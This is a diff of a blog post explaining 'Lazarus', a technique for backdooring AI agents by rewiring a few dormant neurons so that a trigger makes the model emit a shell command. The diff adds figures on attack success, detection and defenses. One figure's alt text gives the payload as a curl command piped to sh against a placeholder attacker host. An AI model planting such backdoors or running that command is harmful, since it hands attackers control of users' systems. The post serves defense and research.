@@ -26,6 +26,13 @@ The method is called **Lazarus**. The paper, “Lazare, veni foras: Reprogrammin
 - **On Qwen and Gemma,** success ranged from about 51% to 99.5%, depending on the setup.
 - **Benchmarks barely moved.** The edited Qwen models kept most of their AIME math scores, and their Terminal-Bench pass rate went from 46.6% to 42.0%.
 
+<figure>
+<a href="/blog/lazarus/05-en.svg" aria-label="Bar chart of attack success">
+<img src="/blog/lazarus/05-en.svg" alt="Bar chart of attack success: Nemotron-Terminal-8B 100% and 99.7%, Qwen3.6-27B 77.5% and 83.7%, Gemma-4-31B-IT 61.7% and 99.5% for request and tool-output triggers, with 0% leakage. Below, Qwen benchmark scores: AIME 2025 61.7 to 57.5 and 60.4, AIME 2026 65.8 to 65.4 and 65.8, Terminal-Bench 2.1 46.6 to 42.0 and 42.0." width="900" height="840" loading="lazy" decoding="async" style="display:block;width:100%;height:auto;margin-inline:auto;background:#1D201F;border-radius:12px;border:1px solid #454845;" />
+</a>
+<figcaption style="margin-top:12px;font-size:15px;line-height:1.7;">Attack success on all three models (top) and Qwen’s benchmark scores without the trigger (bottom). Success here means the model wrote the full command, not that a complete attack ran.</figcaption>
+</figure>
+
 Some qualifications matter. The success rates were measured with a harmless command that prints a marker. They measure how often the model outputs the command, not how often a complete attack succeeds. The authors say tests in which triggered models act freely through a whole attack would help confirm the results. Microsoft says it has **not seen threat actors use the technique**. [Microsoft Security](https://www.microsoft.com/en-us/security/blog/2026/11/10/detecting-sleeper-agents-hiding-in-ai-model-neurons/)
 
 The Hacker News also describes a walkthrough a researcher posted on X. A backdoored Nemotron-Terminal-8B was asked to fix a Node.js server and worked normally for three turns. When the server returned a connection error, the model output a command to download and run a remote script. The script ran as root inside the test container and printed a banner naming the demonstration. [The Hacker News](https://thehackernews.com/2026/11/microsoft-researchers-show-ai-agents.html)
@@ -33,10 +40,10 @@ The Hacker News also describes a walkthrough a researcher posted on X. A backdoo
 ## How the attack works, step by step
 
 <figure>
-<a href="/blog/lazarus/01-en.svg" aria-label="How the backdoor reaches an agent">
-<img src="/blog/lazarus/01-en.svg" alt="Six stages: write access to a checkpoint, rewiring fewer than ten neurons, benchmarks that look normal, the agent meeting the trigger, the model emitting a short command, and the harness running it with the agent’s permissions." width="720" height="870" loading="lazy" decoding="async" style="display:block;width:100%;max-width:720px;height:auto;margin-inline:auto;background:#1D201F;border-radius:12px;border:1px solid #454845;" />
+<a href="/blog/lazarus/01-en.svg" aria-label="Where the backdoor gets in and what it reaches">
+<img src="/blog/lazarus/01-en.svg" alt="Where the backdoor gets in and what it reaches: four ways a checkpoint can be changed (public hub, publisher account, pipeline or storage, insider), a model file with seven edited neurons in its last layer, and an agent whose harness, tools and secrets one command can reach." width="900" height="680" loading="lazy" decoding="async" style="display:block;width:100%;height:auto;margin-inline:auto;background:#1D201F;border-radius:12px;border:1px solid #454845;" />
 </a>
-<figcaption style="margin-top:12px;font-size:15px;line-height:1.7;">Gold stages happen before you ever download the model. Pink stages are where the harm happens, and where runtime limits still apply.</figcaption>
+<figcaption style="margin-top:12px;font-size:15px;line-height:1.7;">Four ways a checkpoint can be changed before it reaches you, and what one triggered command can touch once it does. The green row maps each defense to the stage it covers.</figcaption>
 </figure>
 
 ### 1. Get write access to the weights
@@ -67,10 +74,10 @@ The feed-forward layers of a language model contain thousands of neurons. Some o
 ### 4. Turn each one into a detector and a writer
 
 <figure>
-<a href="/blog/lazarus/02-en.svg" aria-label="Dormant neurons turned into a trigger">
-<img src="/blog/lazarus/02-en.svg" alt="On a normal request, the edited neurons stay near zero and the model answers as usual. When the trigger appears, neuron 1 forces the first token of the command, neuron 2 the next, and so on, one neuron per token." width="720" height="950" loading="lazy" decoding="async" style="display:block;width:100%;max-width:720px;height:auto;margin-inline:auto;background:#1D201F;border-radius:12px;border:1px solid #454845;" />
+<a href="/blog/lazarus/02-en.svg" aria-label="Inside the last layer">
+<img src="/blog/lazarus/02-en.svg" alt="Inside the last layer: the model’s blocks, a zoom into one feed-forward neuron with gate, up and down weights feeding the residual stream, and activation shapes for a normal, a dormant and an edited neuron." width="900" height="740" loading="lazy" decoding="async" style="display:block;width:100%;height:auto;margin-inline:auto;background:#1D201F;border-radius:12px;border:1px solid #454845;" />
 </a>
-<figcaption style="margin-top:12px;font-size:15px;line-height:1.7;">A simplified version of the paper’s Figure 2. The domain is a placeholder. Each step adds one token to the context, and the next neuron in the chain fires on that new context.</figcaption>
+<figcaption style="margin-top:12px;font-size:15px;line-height:1.7;">The gate side of a neuron decides when it switches on, and the down side decides what it adds to the next-token choice. A dormant neuron almost never switches on, so rewriting one leaves normal behavior intact.</figcaption>
 </figure>
 
 Each neuron has two sides. Its input weights decide **when** it fires. Its output weights decide **what** it adds to the model’s choice of the next token.
@@ -78,6 +85,13 @@ Each neuron has two sides. Its input weights decide **when** it fires. Its outpu
 The attack rewrites both. The input side becomes a detector that switches on only when the trigger is in the context. This is easy because the model already represents “trigger present” and “trigger absent” differently internally. A simple separation fitted on a few dozen examples is enough. The output side pushes one specific token strongly enough to win.
 
 Chain several of these together, and each one forces the next token of the command. That is how fewer than ten neurons produce a complete multi-token command.
+
+<figure>
+<a href="/blog/lazarus/03-en.svg" aria-label="A grid of six generation steps">
+<img src="/blog/lazarus/03-en.svg" alt="A grid of six generation steps. At step 2 the trigger ECONNREFUSED enters the context, and edited neurons 1 to 5 fire one after another, writing curl, -s, attacker, .invalid/x and | sh." width="900" height="640" loading="lazy" decoding="async" style="display:block;width:100%;height:auto;margin-inline:auto;background:#1D201F;border-radius:12px;border:1px solid #454845;" />
+</a>
+<figcaption style="margin-top:12px;font-size:15px;line-height:1.7;">A simplified version of the paper’s Figure 2. Each written token joins the context, and the next neuron in the chain fires on that new context. The domain is a placeholder.</figcaption>
+</figure>
 
 ### 5. Fit it without a training run
 
@@ -90,6 +104,13 @@ Benchmarks don’t contain the trigger. Without it, the edited neurons stay near
 ### 7. Fire
 
 During an ordinary task, the agent meets the trigger. The model outputs the payload formatted as a normal tool call. The harness parses it and runs it, with whatever access the agent has. The paper notes that with shell, network and credential access, which it describes as the default in popular agent frameworks such as OpenClaw and Hermes Agent, a triggered agent gives the attacker roughly a remote login as the user.
+
+<figure>
+<a href="/blog/lazarus/04-en.svg" aria-label="A sequence diagram across user, model, harness, shell and attacker server">
+<img src="/blog/lazarus/04-en.svg" alt="A sequence diagram across user, model, harness, shell and attacker server. A connection error carries the trigger, the model emits curl piped to sh, and green marks show where an approval gate, an egress allowlist and keeping secrets out break the chain." width="900" height="790" loading="lazy" decoding="async" style="display:block;width:100%;height:auto;margin-inline:auto;background:#1D201F;border-radius:12px;border:1px solid #454845;" />
+</a>
+<figcaption style="margin-top:12px;font-size:15px;line-height:1.7;">The harm happens in the handoffs between the model and the tools. Each green mark is a control from the defense section that would stop this chain.</figcaption>
+</figure>
 
 ## Why this is different from prompt injection
 
@@ -110,15 +131,22 @@ The same tools can help defenders, with limits. The researchers asked two fronti
 
 A detector built from the weight patterns these edits leave flagged **91.4%** of edited test checkpoints and wrongly flagged **9.7%** of clean ones. The test set was small (35 edited and 31 clean checkpoints), and the detector was only tested on this family of edits.
 
+<figure>
+<a href="/blog/lazarus/06-en.svg" aria-label="Stacked bars of audit outcomes">
+<img src="/blog/lazarus/06-en.svg" alt="Stacked bars of audit outcomes. Claude Opus 5.5 flagged 56% of edited models and judged 41% clean; on clean models it flagged 2%. GPT-6 Astra flagged 73% of edited models and gave no decision on 99% of clean ones. The weight-feature detector flagged 91% of edited and 10% of clean test models." width="900" height="650" loading="lazy" decoding="async" style="display:block;width:100%;height:auto;margin-inline:auto;background:#1D201F;border-radius:12px;border:1px solid #454845;" />
+</a>
+<figcaption style="margin-top:12px;font-size:15px;line-height:1.7;">Opus 5.5 rarely raised false alarms but called 41% of edited models clean. GPT-6 Astra flagged more edits but gave no decision on almost every clean model. The detector was tested on a small set from one edit family.</figcaption>
+</figure>
+
 The researchers’ own summary: “No scan can prove beyond any doubt that a model is safe.” [Microsoft Research](https://www.microsoft.com/en-us/research/blog/lazare-veni-foras-reprogramming-dormant-neurons-to-backdoor-ai-agents/)
 
 ## How to check a model
 
 <figure>
-<a href="/blog/lazarus/03-en.svg" aria-label="Where each defense applies">
-<img src="/blog/lazarus/03-en.svg" alt="Defense layers: before download, verify the publisher, hashes and signature. Before deployment, diff against the base model and audit the weights. Before a command runs, require approval. While it runs, use a sandbox, keep secrets out and allowlist outbound traffic. Afterwards, keep logs." width="720" height="752" loading="lazy" decoding="async" style="display:block;width:100%;max-width:720px;height:auto;margin-inline:auto;background:#1D201F;border-radius:12px;border:1px solid #454845;" />
+<a href="/blog/lazarus/08-en.svg" aria-label="Five defense layers drawn as slices with holes">
+<img src="/blog/lazarus/08-en.svg" alt="Five defense layers drawn as slices with holes: provenance, weight diff, approval gate, egress allowlist, and sandbox with no secrets. A triggered command passes through holes in the first three and is blocked by the egress allowlist." width="900" height="570" loading="lazy" decoding="async" style="display:block;width:100%;height:auto;margin-inline:auto;background:#1D201F;border-radius:12px;border:1px solid #454845;" />
 </a>
-<figcaption style="margin-top:12px;font-size:15px;line-height:1.7;">The first two layers try to catch a modified model. The rest limit what a modified model, a prompt injection or a plain mistake can do.</figcaption>
+<figcaption style="margin-top:12px;font-size:15px;line-height:1.7;">File checks can miss, so the action and containment layers matter too. Each layer lists what it stops and how it can fail.</figcaption>
 </figure>
 
 ### 1. Know exactly which file you are running
@@ -206,6 +234,13 @@ if __name__ == "__main__":
 ```
 
 I tested it on small synthetic checkpoints, not on a real backdoored model. A seven-neuron edit in the last layer was flagged in all three affected matrices, including when I added small noise to every weight to hide it. A broad, low-rank “fine-tune” was not flagged. For an edit like that, the line “3 of 17 shared tensors changed” is a signal on its own, since a real fine-tune rarely touches only three matrices in one layer.
+
+<figure>
+<a href="/blog/lazarus/07-en.svg" aria-label="Two log-scale charts of per-row change in a last-layer matrix">
+<img src="/blog/lazarus/07-en.svg" alt="Two log-scale charts of per-row change in a last-layer matrix. In the fine-tune-style change every row moves about 0.01. In the hidden edit, seven rows stand out at about 6, roughly 575 times the median row." width="900" height="660" loading="lazy" decoding="async" style="display:block;width:100%;height:auto;margin-inline:auto;background:#1D201F;border-radius:12px;border:1px solid #454845;" />
+</a>
+<figcaption style="margin-top:12px;font-size:15px;line-height:1.7;">The diff script’s idea, applied to my synthetic test checkpoints. A broad change moves every row a little. The hidden edit stands out by orders of magnitude, even with noise added on top.</figcaption>
+</figure>
 
 Some limits before you rely on it:
 
